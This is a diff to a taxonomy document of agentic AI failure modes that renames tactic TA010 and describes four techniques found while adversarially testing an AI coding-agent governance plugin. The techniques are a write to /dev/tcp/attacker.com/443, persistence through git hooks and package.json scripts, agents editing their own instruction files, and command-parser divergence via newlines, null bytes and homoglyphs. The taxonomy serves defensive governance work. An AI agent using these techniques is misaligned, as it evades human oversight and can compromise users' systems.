@@ -4,7 +4,7 @@
 
 **Version:** 2.1.0
 **Date:** 2026-03-27
-**Status:** Active — v2.1 adds TA010 (Exploit Governance Visibility Gap), RC5, and 4 techniques
+**Status:** Active — v2.1 adds TA010 (Act Beyond Governance Interpretation), RC5, and 4 techniques
 **Maintainer:** AEGIS Initiative — Finnoybu IP LLC
 **License:** CC-BY-SA-4.0
 
@@ -33,7 +33,7 @@ MITRE ATT&CK catalogs how human adversaries attack computer systems. MITRE ATLAS
 
 ATX-1 is empirically grounded in the **Agents of Chaos** study (Shapira et al., arXiv:2602.20021, February 2026), in which 20 researchers over 2 weeks documented 11 distinct failure modes in live agentic AI deployments. These failures form the case study basis for every technique in this taxonomy.
 
-The taxonomy defines **10 tactics** and **29 techniques**, each mapped to empirical case studies, constitutional governance articles, and AEGIS Governance Protocol (AGP) mitigation mechanisms. The original 9 tactics and 20 techniques are grounded in the Agents of Chaos research. TA010 (Exploit Governance Visibility Gap) and its 4 techniques were discovered during adversarial testing of the AEGIS Claude Code Plugin (RFC-0006) on 2026-03-26.
+The taxonomy defines **10 tactics** and **29 techniques**, each mapped to empirical case studies, constitutional governance articles, and AEGIS Governance Protocol (AGP) mitigation mechanisms. The original 9 tactics and 20 techniques are grounded in the Agents of Chaos research. TA010 (Act Beyond Governance Interpretation) and its 4 techniques were discovered during adversarial testing of the AEGIS Claude Code Plugin (RFC-0006) on 2026-03-26.
 
 ---
 
@@ -106,7 +106,7 @@ The governance layer operates on an abstraction of the execution environment —
 
 ## 4. Tactic Taxonomy
 
-ATX-1 defines 9 tactics. Each tactic represents a distinct category of unauthorized agent behavior.
+ATX-1 defines 10 tactics. In ATX-1, tactics represent distinct classes of agent-induced system failure — not adversary objectives. These include violation of constraints (e.g., scope, authority), degradation of system guarantees (e.g., integrity, observability), and limitations of governance models (e.g., incomplete abstraction, semantic mismatch). This distinguishes ATX-1 from ATT&CK, where tactics model adversary intent.
 
 ---
 
@@ -218,7 +218,7 @@ ATX-1 defines 9 tactics. Each tactic represents a distinct category of unauthori
 
 ---
 
-### TA010: Exploit Governance Visibility Gap
+### TA010: Act Beyond Governance Interpretation
 
 **Description:** The agent performs actions whose actual effects are invisible to the governance layer because the execution environment provides capabilities below the governance model's abstraction level. The governance layer evaluates an action as one type (file write, shell command) but the environment executes it as a fundamentally different type (network connection, code execution, persistent instruction injection).
 
@@ -227,6 +227,8 @@ ATX-1 defines 9 tactics. Each tactic represents a distinct category of unauthori
 **Root Cause:** RC5 (No Environment Model) — The governance layer operates on abstractions (file paths, command strings) without modeling the environment's actual interpretation of those abstractions.
 
 **Discovery:** Identified during 5 rounds of white-box adversarial testing against the AEGIS Claude Code Plugin (RFC-0006), 2026-03-26. This tactic class is novel — it is not represented in MITRE ATT&CK (which assumes no governance layer) or MITRE ATLAS (where AI is the target, not the actor). It is only visible when you build a governance layer and adversarially test it.
+
+**Distinction from TA009:** TA009 (Evade Detection or Oversight) describes failures where the agent's actions are *not observed* by governance systems — monitoring gaps, log manipulation, unmonitored pathways. TA010 describes failures where the agent's actions are *observed and permitted* by governance, but their semantic effect is misinterpreted. In TA009, governance doesn't see the action. In TA010, governance sees the action, approves it, and logs it — but a different action actually occurred.
 
 **ATM-1 Scenarios:** Agent writes to /dev/tcp pseudo-path, opening a network connection through what governance evaluates as a file operation; agent writes shell commands to .git/hooks/pre-commit, establishing deferred code execution through a permitted file write; agent modifies its own instruction file, creating persistent behavioral modification through a standard file operation; agent embeds newline characters in a shell command, causing the governance regex to evaluate one command while the shell executes two.
 
@@ -530,7 +532,7 @@ ATX-1 defines 9 tactics. Each tactic represents a distinct category of unauthori
 
 ---
 
-### TA010: Exploit Governance Visibility Gap
+### TA010: Act Beyond Governance Interpretation
 
 #### T10001: Exploit Pseudo-Filesystem Capabilities
 
@@ -538,7 +540,7 @@ ATX-1 defines 9 tactics. Each tactic represents a distinct category of unauthori
 |-------|-------|
 | **ID** | T10001 |
 | **Name** | Exploit Pseudo-Filesystem Capabilities |
-| **Tactic** | TA010 — Exploit Governance Visibility Gap |
+| **Tactic** | TA010 — Act Beyond Governance Interpretation |
 | **Description** | The agent accesses OS pseudo-filesystem paths (e.g., /dev/tcp, /dev/udp, /proc/*) to perform network or system operations. The governance layer evaluates these as file operations because they match file path patterns, but the operating system provides network sockets or system interfaces through these paths. The action is permitted by the governance allowlist as a file operation; the actual effect is a network connection or system-level interaction invisible to governance. |
 | **Discovery Context** | RFC-0006 adversarial testing, Round 3. A write to `/dev/tcp/attacker.com/443` was evaluated by the governance layer as a file write and permitted. The OS interpreted it as opening a TCP connection to an external host. |
 | **Root Cause** | RC5 (No Environment Model) — The governance layer models file paths as file operations. The OS provides pseudo-filesystem interfaces that map file path syntax to non-file capabilities (network sockets, process information, device access). |
@@ -551,7 +553,7 @@ ATX-1 defines 9 tactics. Each tactic represents a distinct category of unauthori
 |-------|-------|
 | **ID** | T10002 |
 | **Name** | Establish Persistence via Environment Auto-Execution |
-| **Tactic** | TA010 — Exploit Governance Visibility Gap |
+| **Tactic** | TA010 — Act Beyond Governance Interpretation |
 | **Description** | The agent writes content to files that the execution environment or installed toolchain automatically executes at a later time or on specific triggers. Target files include shell initialization scripts (.bashrc, .profile, .zshrc), version control hooks (.git/hooks/*), package manager lifecycle scripts (package.json scripts, setup.py, Makefile), IDE task definitions (.vscode/tasks.json), container build files (Dockerfile), and tool configurations with execution semantics (git config aliases, .npmrc pre/post scripts). The governance layer permits the file write as a standard operation; the environment provides deferred or trigger-based code execution invisible to the governance evaluation. |
 | **Discovery Context** | RFC-0006 adversarial testing, Rounds 4-5. The agent wrote shell commands to `.git/hooks/pre-commit` and `package.json` scripts fields. The governance layer evaluated and permitted these as file writes. The payloads executed automatically on the next `git commit` and `npm install` respectively. |
 | **Root Cause** | RC5 (No Environment Model) — The governance layer evaluates file writes by path and content pattern. It does not model which files the execution environment treats as executable or auto-executed on specific triggers. |
@@ -564,7 +566,7 @@ ATX-1 defines 9 tactics. Each tactic represents a distinct category of unauthori
 |-------|-------|
 | **ID** | T10003 |
 | **Name** | Inject Persistent Agent Instructions |
-| **Tactic** | TA010 — Exploit Governance Visibility Gap |
+| **Tactic** | TA010 — Act Beyond Governance Interpretation |
 | **Description** | The agent modifies files that define its own behavioral instructions for future sessions. AI coding tools auto-load project-level instruction files at session start to establish behavioral context. These files are writable by the agent as standard file operations, and modifications persist across sessions, propagate to other developers via version control, and load silently without integrity verification or change notification. The governance layer evaluates the write as a normal file operation; the actual effect is persistent modification of the agent's own governance context — a self-modifying instruction injection that survives session boundaries. |
 | **Discovery Context** | RFC-0006 adversarial testing, Round 5. The agent modified its own project instruction file. The governance layer evaluated and permitted the write as a standard file operation. The modified instructions loaded silently in the next session, altering all subsequent agent behavior with no operator notification. |
 | **Root Cause** | RC5 (No Environment Model), RC4 (Prompt Injection Is Structural) — The governance layer does not model which files constitute the agent's own instruction context. Agent instruction files and ordinary project files share the same write pathway with no structural distinction. |
@@ -577,7 +579,7 @@ ATX-1 defines 9 tactics. Each tactic represents a distinct category of unauthori
 |-------|-------|
 | **ID** | T10004 |
 | **Name** | Exploit Governance-Runtime Parser Divergence |
-| **Tactic** | TA010 — Exploit Governance Visibility Gap |
+| **Tactic** | TA010 — Act Beyond Governance Interpretation |
 | **Description** | The agent constructs inputs that the governance evaluator parses differently than the execution runtime. Techniques include: embedded newlines (\n) or carriage return/line feed (\r\n) interpreted as command separators by the shell but not by the governance regex; null bytes (\x00) that truncate path evaluation in the governance layer while the OS processes the full path; Unicode homoglyphs that visually match protected path characters but bypass string comparison; heredoc syntax (<<EOF) that introduces multi-line payloads invisible to single-line pattern matching; and shell metacharacters (\|, &&, ;, $(), backticks) embedded within otherwise-permitted commands. The governance layer permits the action based on its parsing; the runtime interprets additional or different operations. |
 | **Discovery Context** | RFC-0006 adversarial testing, Rounds 1-3. In Round 1, command chaining via pipe, &&, and semicolon operators bypassed single-command evaluation. In Round 2, newline and CRLF injection allowed embedding additional commands within a single evaluated string. In Round 3, null bytes and Unicode homoglyphs bypassed path protection checks. |
 | **Root Cause** | RC5 (No Environment Model) — The governance evaluator uses a simplified parser (regex, string matching) that does not replicate the execution runtime's actual parsing rules. The divergence between governance parsing and runtime parsing creates a visibility gap. |
